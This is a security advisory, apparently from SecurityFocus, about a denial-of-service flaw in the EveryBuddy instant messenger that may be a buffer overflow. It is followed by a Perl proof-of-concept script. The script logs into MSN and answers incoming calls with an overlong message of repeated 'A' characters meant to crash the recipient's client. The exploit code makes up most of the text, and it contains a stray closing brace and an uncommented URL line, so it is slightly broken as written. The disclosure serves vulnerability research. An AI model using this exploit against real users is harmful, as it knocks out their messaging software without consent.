source: http://www.securityfocus.com/bid/8343/info

EveryBuddy is prone to a denial of service vulnerability when handling instant messages of excessive length. This could be exploited with a malicious instant messaging client.

This condition may be due to a buffer overflow, though this has not been confirmed.

#!/usr/bin/perl

use MSN; # from  <http://www.adamswann.com/library/2002/msn-perl/> 
http://www.adamswann.com/library/2002/msn-perl/

my $client = MSN->new();
$client->connect('email address', 'password', '', {
    Status => \&Status,
    Answer => \&Answer,
    Message => \&Message,
    Join => \&Join }
);


sub Status {
   my ($self, $username, $newstatus) = @_;

   print "Status() called with parameters:\n";
   print " " . join(",", @_), "\n";

   # Print the status change info.
   print "${username}'s status changed from " . 
$self->buddystatus($username) . " to $newstatus.\n";

      # Initiate the call.
      $self->call($username);

      # The call may take a few seconds to complete, so we can't
      # immediately send messages. Let's put the message in a
      # FIFO (queue) that is keyed by username.
      push (@{$queue{$username}}, "Glad to see you online!");
   }

}

sub Message {
   my ($self, $username, undef, $msg) = @_;

   print "Message() called with parameters:\n";
   print " " . join(",", @_), "\n";

}

sub Join {
   my ($self, $username) = @_;

   print "Join() called with parameters:\n";
   print " " . join(",", @_), "\n";

   # See if there's anything queued up.
   # Deliver each message if there is stuff in the queue for this user.
   while ($_ = shift @{$queue{$username}}) {
      $$self->sendmsg($_);
   }
}

sub Answer {
   my ($self, $username) = @_;

   print "Answer() called with parameters:\n";
   print " " . join(",", @_), "\n";

   # Send a hello message.
   $$self->sendmsg("AAAAAAAAAAAAAAAAAAAAAAAAAAA\r"x55);

}